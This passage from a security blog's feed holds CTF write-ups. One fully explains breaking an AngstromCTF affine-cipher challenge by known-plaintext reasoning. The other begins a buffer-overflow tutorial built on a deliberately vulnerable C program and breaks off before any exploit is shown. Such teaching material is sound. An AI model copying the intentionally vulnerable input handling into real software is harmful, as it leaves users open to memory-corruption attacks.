&lt;p&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">A warm-up forensic challenge proposed by NDH16…</summary></entry><entry><title type="html">A very fine cipher: Warmup - AngstromCTF</title><link href="http://localhost:4000/crypto/2018/06/24/A-very-fine-cipher-Warmup-AngstromCTF.html" rel="alternate" type="text/html" title="A very fine cipher: Warmup - AngstromCTF" /><published>2018-06-24T23:00:00+02:00</published><updated>2018-06-24T23:00:00+02:00</updated><id>http://localhost:4000/crypto/2018/06/24/A-very-fine-cipher-Warmup-AngstromCTF</id><content type="html" xml:base="http://localhost:4000/crypto/2018/06/24/A-very-fine-cipher-Warmup-AngstromCTF.html">&lt;p&gt;Here comes the first Cryptographic challenge! We’ll start with an easy one but nonetheless useful. We will establish the mathematical foundations needed for understanding more complicated codes such as RSA…
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;

&lt;p&gt;The challenge statement is very explicit:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Just a quick warm-up cipher for everyone. Honestly, I think it’s &lt;strong&gt;a fine&lt;/strong&gt; cipher.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;myjd{ij_fkwizq}&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The sentence in bold has to be decoded in order to get the flag and to validate the challenge.&lt;/p&gt;

&lt;p&gt;If you’re already familiar with affine cipher or just want to read the challenge’s write-up, you can jump straight to the &lt;em&gt;Breaking the code&lt;/em&gt; section.&lt;/p&gt;

&lt;h2 id=&quot;information-gathering&quot;&gt;Information gathering&lt;/h2&gt;

&lt;p&gt;The information gathering part of the analysis is probably the most important as it can be really time-saving. That’s why we’ll try to gather as much information as possible.&lt;/p&gt;

&lt;p&gt;The first thing that jumps out is the format of the ciphered text. Each CTF contest has its own flag format so participants know when they have solved the challenge.
In the context of AngstromCTF, each flag respects the following convention: &lt;strong&gt;actf{…}&lt;/strong&gt;, which is suspiciously close to our ciphered text.&lt;/p&gt;

&lt;p&gt;Cryptanalysis can be greatly simplified when the plain text language is known. Since AngstromCTF is an international event, the language used is probably english.&lt;/p&gt;

&lt;p&gt;The most useful information turns out to be the discrete hint given in the challenge description. Indeed, “a fine” is in bold for a reason. It’s actually a wordplay with &lt;strong&gt;affine cipher&lt;/strong&gt;… These funny organizers decided to save us a lot of time!&lt;/p&gt;

&lt;h2 id=&quot;affine-cipher&quot;&gt;Affine cipher&lt;/h2&gt;

&lt;p&gt;The affine cipher is a type of &lt;strong&gt;monoalphabetic substitution cipher&lt;/strong&gt; based on a simple mathematical function. It has only been used for its educational purposes due to its weaknesses. We’ll study the functionning of this cipher and how to break it in order to decode our mistery sentence.&lt;/p&gt;

&lt;h3 id=&quot;monoalphabetic-substitution-cipher&quot;&gt;Monoalphabetic substitution cipher&lt;/h3&gt;

&lt;p&gt;A &lt;strong&gt;substitution cipher&lt;/strong&gt; is a method of encrypting which replaces each letter of the plain text by a letter of the ciphered text. In most of the case, the replacement unit is a single letter but it could also be a group of three letters. The &lt;strong&gt;plain text&lt;/strong&gt; and the &lt;strong&gt;ciphered&lt;/strong&gt; one will have &lt;strong&gt;the exact same length&lt;/strong&gt; when using a substitution cipher.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Monoalphabetic&lt;/strong&gt; means that the same alphabet is used for encrypting the whole message. On the contrary, &lt;strong&gt;Polyalphabetic&lt;/strong&gt; substitution ciphers will use multiple alphabets for encrypting the same message. They are generally much &lt;strong&gt;stronger&lt;/strong&gt; than &lt;strong&gt;Monoalphabetic ciphers&lt;/strong&gt; because each letter of the plaintext is usually mapped to multiple different letters in the ciphered text.&lt;/p&gt;

&lt;h3 id=&quot;encryption&quot;&gt;Encryption&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;The first step of the encryption process consists in assigning an integer in the range 0 to \(m-1\) to each letter, where &lt;strong&gt;m is the size of the alphabet&lt;/strong&gt; (usually 26).&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;a&lt;/td&gt;
      &lt;td&gt;b&lt;/td&gt;
      &lt;td&gt;c&lt;/td&gt;
      &lt;td&gt;d&lt;/td&gt;
      &lt;td&gt;e&lt;/td&gt;
      &lt;td&gt;f&lt;/td&gt;
      &lt;td&gt;g&lt;/td&gt;
      &lt;td&gt;h&lt;/td&gt;
      &lt;td&gt;…&lt;/td&gt;
      &lt;td&gt;w&lt;/td&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;y&lt;/td&gt;
      &lt;td&gt;z&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;…&lt;/td&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;23&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;25&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;Then we have to define a pair of integers \((a,b)\) which will represent &lt;strong&gt;the key&lt;/strong&gt;. In order to be able to decipher the message, &lt;strong&gt;a must be coprime with m&lt;/strong&gt;. If it’s not the case, the same integer will be associated with more than one letter in our table.
This gives the following list of possibilities for \(a\): 1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For the example, we will choose the couple \((a = 5, b = 8)\) as the key.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Now that each letter is associated with an integer and that we have defined the key, we are ready to encrypt the message. In order to do this, we simply have to apply the mathematical formula that defines the affine cipher, with \(x\) being the &lt;strong&gt;integer associated with the letter&lt;/strong&gt; we want to encrypt:&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;E(x) = (ax + b)\mod{m}&lt;/script&gt;

&lt;p&gt;To give you an example, let’s say we want to encrypt the following sentence using the key defined above:&lt;/p&gt;

&lt;p&gt;CRYPTOISLOVE&lt;/p&gt;

&lt;p&gt;We will get the integers associated with each letter as the following:&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;C&lt;/td&gt;
      &lt;td&gt;R&lt;/td&gt;
      &lt;td&gt;Y&lt;/td&gt;
      &lt;td&gt;P&lt;/td&gt;
      &lt;td&gt;T&lt;/td&gt;
      &lt;td&gt;O&lt;/td&gt;
      &lt;td&gt;I&lt;/td&gt;
      &lt;td&gt;S&lt;/td&gt;
      &lt;td&gt;L&lt;/td&gt;
      &lt;td&gt;O&lt;/td&gt;
      &lt;td&gt;V&lt;/td&gt;
      &lt;td&gt;E&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;17&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;19&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Then, we will apply the encryption function for each letter resulting in the following:&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;17&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;19&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;25&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;20&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;blockquote&gt;
  &lt;p&gt;Detail of the first column:
&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
\begin{eqnarray}
E(2) &amp;=&amp; 2\times 5 + 8\mod{26}\\
E(2) &amp;=&amp; 18
\end{eqnarray} %]]&gt;&lt;/script&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;And convert back the obtained integers into letters to get the ciphered message:&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;25&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;20&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;S&lt;/td&gt;
      &lt;td&gt;P&lt;/td&gt;
      &lt;td&gt;Y&lt;/td&gt;
      &lt;td&gt;F&lt;/td&gt;
      &lt;td&gt;Z&lt;/td&gt;
      &lt;td&gt;A&lt;/td&gt;
      &lt;td&gt;W&lt;/td&gt;
      &lt;td&gt;U&lt;/td&gt;
      &lt;td&gt;L&lt;/td&gt;
      &lt;td&gt;A&lt;/td&gt;
      &lt;td&gt;J&lt;/td&gt;
      &lt;td&gt;C&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;The encryption is done!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;NOTE: We can notice that some popular shift ciphers such as &lt;strong&gt;Caesar cipher&lt;/strong&gt; or &lt;strong&gt;ROT13&lt;/strong&gt; are basically affine ciphers with the &lt;strong&gt;a coefficient set to 1&lt;/strong&gt; and the &lt;strong&gt;b coefficient representing the shift&lt;/strong&gt;. We can describe these ciphers as affine ciphers using the following keys: &lt;strong&gt;Caesar(1,3)&lt;/strong&gt; &amp;amp; &lt;strong&gt;ROT13(1,13)&lt;/strong&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;decryption&quot;&gt;Decryption&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;The first step of the decryption process consists in replacing each letter of the ciphered text with the corresponding integer.&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;S&lt;/td&gt;
      &lt;td&gt;P&lt;/td&gt;
      &lt;td&gt;Y&lt;/td&gt;
      &lt;td&gt;F&lt;/td&gt;
      &lt;td&gt;Z&lt;/td&gt;
      &lt;td&gt;A&lt;/td&gt;
      &lt;td&gt;W&lt;/td&gt;
      &lt;td&gt;U&lt;/td&gt;
      &lt;td&gt;L&lt;/td&gt;
      &lt;td&gt;A&lt;/td&gt;
      &lt;td&gt;J&lt;/td&gt;
      &lt;td&gt;C&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;25&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;20&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;Then we have to find the &lt;strong&gt;modular multiplicative inverse&lt;/strong&gt; of \(a\). There are different ways to do it which won’t be detailed here. If you’re interested in knowing how to compute it, you should have a look at &lt;a href=&quot;https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm&quot;&gt;Extended Euclidean algorithm&lt;/a&gt; and &lt;a href=&quot;https://en.wikipedia.org/wiki/Euler%27s_theorem&quot;&gt;Euler’s theorem&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In our previous example, the &lt;strong&gt;modular multiplicative inverse&lt;/strong&gt; of \(a\) is 21. We will call it \(a’\).&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Now can apply the following decryption function to each integer of the table and convert the result back into letter to get the deciphered message.&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;D(x) = a'(x-b)\mod{m}&lt;/script&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;25&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;20&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;17&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;19&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;After converting the integers back into letters we will recover the original plain text.&lt;/p&gt;

&lt;h2 id=&quot;breaking-the-code&quot;&gt;Breaking the code&lt;/h2&gt;

&lt;p&gt;Now that we have a clearer idea of the mechanisms involved by affine cipher, we can eventually spot the weaknesses. In order to decode the ciphered sentence, we have to either find the key or find another way to recover the plain text.&lt;/p&gt;

&lt;h3 id=&quot;kerckhoffs-principle&quot;&gt;Kerckhoffs’ Principle&lt;/h3&gt;

&lt;p&gt;Kerckhoffs’ Principle is a basic design principle of modern cryptography formulated by Auguste Kerckhoffs in 1883.&lt;/p&gt;

&lt;p&gt;It goes as follows:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;A cryptographic system should be secure even if everything about the system, except the key, is public knowledge.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The affine cipher often uses an alphabet of 26 letters including 12 numbers which are coprime with 26. This gives us a total of \(12 \times 26 = 312\) possible keys.&lt;/p&gt;

&lt;p&gt;This is something we can easily bruteforce so this cipher is considered as highly insecure in the light of Kerckhoffs’ Principle.&lt;/p&gt;

&lt;h3 id=&quot;frequency-analysis&quot;&gt;Frequency Analysis&lt;/h3&gt;

&lt;p&gt;Frequency Analysis is a very popular method of cryptanalysis. It consists in studying the frequency of letters in a ciphertext.
For example, if the most occurent letter in a ciphered text is “Z”, you can suppose that “Z” replaces the most common letter of the source language (which is “E” in the English language).&lt;/p&gt;

&lt;p&gt;Every monoalphabetic substitution cipher is vulnerable to this method of cryptanalysis. However, it requires a long ciphered text for the frequency analysis to be relevant. In the context of this challenge, we only have a single sentence, which is clearly not sufficient. Let’s save this method for another challenge… :wink:&lt;/p&gt;

&lt;h3 id=&quot;not-even-funny&quot;&gt;Not even funny&lt;/h3&gt;

&lt;p&gt;We said earlier that the key was easily crackable thanks to a fine &lt;strong&gt;bruteforce algorithm&lt;/strong&gt;. This is the dumb but efficient way to achieve the challenge.
Feel free to write a small &lt;strong&gt;script&lt;/strong&gt; which will &lt;strong&gt;test the 312 possible keys&lt;/strong&gt; and decode the message. It’s always good to practice our scripting skills.&lt;/p&gt;

&lt;p&gt;However, this may not be necessary to write a script for solving this challenge, as we will see in the next part.&lt;/p&gt;

&lt;h3 id=&quot;smart-way---known-plain-attack&quot;&gt;Smart way - Known plain attack&lt;/h3&gt;

&lt;p&gt;This is where the &lt;em&gt;information gathering&lt;/em&gt; part becomes interesting. We’ve noticed the suspiceous beginning of the ciphered text which is very close to the flag format of this CTF.&lt;/p&gt;

&lt;p&gt;It is quite likely that &lt;strong&gt;actf{…}&lt;/strong&gt; becomes &lt;strong&gt;myjd{…}&lt;/strong&gt; when encrypted. If we find the key that gives such ciphered text, we will be able to decrypt the rest of the flag.&lt;/p&gt;

&lt;p&gt;This is called a &lt;strong&gt;known plain attack&lt;/strong&gt;. We know a part of the plain text and it’s corresponding ciphered text. From that, we can guess the key and decode the whole message. This type of attack is not always possible but it works perfectly in our case.&lt;/p&gt;

&lt;h4 id=&quot;demonstration&quot;&gt;Demonstration&lt;/h4&gt;

&lt;p&gt;Once again, we assign an integer to each letter of the plain and the ciphered text:&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;a&lt;/td&gt;
      &lt;td&gt;c&lt;/td&gt;
      &lt;td&gt;t&lt;/td&gt;
      &lt;td&gt;f&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;19&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;m&lt;/td&gt;
      &lt;td&gt;y&lt;/td&gt;
      &lt;td&gt;j&lt;/td&gt;
      &lt;td&gt;d&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;12&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;According to our hypothesis that the beginning of the ciphered text corresponds to &lt;strong&gt;actf{&lt;/strong&gt;, we have:&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{eqnarray}
	E(0) &amp;=&amp; 12\\
	E(2) &amp;=&amp; 24\\
	E(19) &amp;=&amp; 9\\
	E(5) &amp;=&amp; 3\\
\end{eqnarray} %]]&gt;&lt;/script&gt;

&lt;p&gt;The first equation means that when we encrypt the letter number 0, it gives the letter number 12.
We won’t need more than the first two equations in order to find the key.&lt;/p&gt;

&lt;p&gt;This gives the following system:&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\left\{
\begin{array}{r c l}
0a + b &amp;\equiv&amp; \boxed{12}\mod{26}\\
2a + b &amp;\equiv&amp; 24\mod{26}\\
\end{array}
\right. %]]&gt;&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{array}{r c l}
\Leftrightarrow 2a &amp;\equiv&amp; 12\mod{26}\\
\Leftrightarrow 2a &amp;\equiv&amp; 38\mod{26}\\
\Leftrightarrow a &amp;\equiv&amp; \boxed{19}\mod{26}\\
\end{array} %]]&gt;&lt;/script&gt;

&lt;p&gt;Here is the key!&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;key (19,12)&lt;/script&gt;

&lt;h4 id=&quot;decryption-1&quot;&gt;Decryption&lt;/h4&gt;

&lt;p&gt;Using the key and the previously explained process of decryption, we are able to recover the plain text, which was indeed a magnificent flag!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;actf{it_begins}&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;That’s it for this challenge but don’t worry, it was only the warm-up! :blush: Do not hesitate to leave a comment or to contact me for any question or inquiry.&lt;/p&gt;

&lt;p&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Here comes the first Cryptographic challenge! We’ll start with an easy one but nonetheless useful. We will establish the mathematical foundations needed for understanding more complicated codes such as RSA…</summary></entry><entry><title type="html">Introduction to Buffer Overflows: CookieJar - AngstromCTF</title><link href="http://localhost:4000/pwning/2018/06/05/Introduction-to-Buffer-Overflows-CookieJar-AngstromCTF.html" rel="alternate" type="text/html" title="Introduction to Buffer Overflows: CookieJar - AngstromCTF" /><published>2018-06-05T08:35:00+02:00</published><updated>2018-06-05T08:35:00+02:00</updated><id>http://localhost:4000/pwning/2018/06/05/Introduction-to-Buffer-Overflows-CookieJar-AngstromCTF</id><content type="html" xml:base="http://localhost:4000/pwning/2018/06/05/Introduction-to-Buffer-Overflows-CookieJar-AngstromCTF.html">&lt;p&gt;For my first article on this blog, I’ll present you my write-up of “CookieJar” from the AngstromCTF. This challenge was accessible and very straight-forward, which constitutes the prefect opportunity to introduce &lt;strong&gt;Buffer Overflows&lt;/strong&gt;…
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h2 id=&quot;pre-requisites&quot;&gt;Pre-requisites&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;A very basic understanding of &lt;strong&gt;x86 or x64 architectures&lt;/strong&gt; will help you to grasp the concept of buffer overflow.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-06-05/challenge.png&quot; alt=&quot;challenge statement&quot; title=&quot;Statement&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have &lt;a href=&quot;/assets/2018-06-05/cookiePublic.c&quot;&gt;a binary&lt;/a&gt; and the corresponding &lt;a href=&quot;/assets/2018-06-05/cookiePublic64&quot;&gt;source code&lt;/a&gt; given for this challenge. The objective is to find a way to exploit this binary locally and to re-use the same exploit on the remote server in order to get the flag.&lt;/p&gt;

&lt;p&gt;The first thing we should do in this case is to analyze the program and its source code.&lt;/p&gt;

&lt;h2 id=&quot;program-analysis&quot;&gt;Program analysis&lt;/h2&gt;
&lt;h3 id=&quot;lets-run-it-&quot;&gt;Let’s run it !&lt;/h3&gt;

&lt;p&gt;Here is a standard execution:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@csb:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the cookie jar:
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 100
Sorry, you only had 0 cookies, try again!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The program asks for an number of cookies in the jar but no matter what we submit, it seems that we are stuck with 0 cookies.&lt;/p&gt;

&lt;p&gt;Alright, now let’s dive into the code!&lt;/p&gt;

&lt;h3 id=&quot;source-code-dissection&quot;&gt;Source code dissection&lt;/h3&gt;

&lt;p&gt;The code is pretty simple so the vulnerability should jump out.&lt;/p&gt;

&lt;p&gt;Don’t pay attention to the first part of the main function, it only sets the execution rights of the program.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;gid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;setresgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Here are the noticeable parts:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A variable named &lt;strong&gt;numCookies&lt;/strong&gt; is declared and initialized with 0.
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numCookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;A buffer is declared with a size of 64 characters for storing the user input.
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;A simple check is done on &lt;strong&gt;numCookies&lt;/strong&gt; and displays the &lt;strong&gt;flag&lt;/strong&gt; if numCookies&amp;gt;=100.
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;numCookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Congrats, you have %d cookies!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numCookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Here's your flag: %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FLAG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
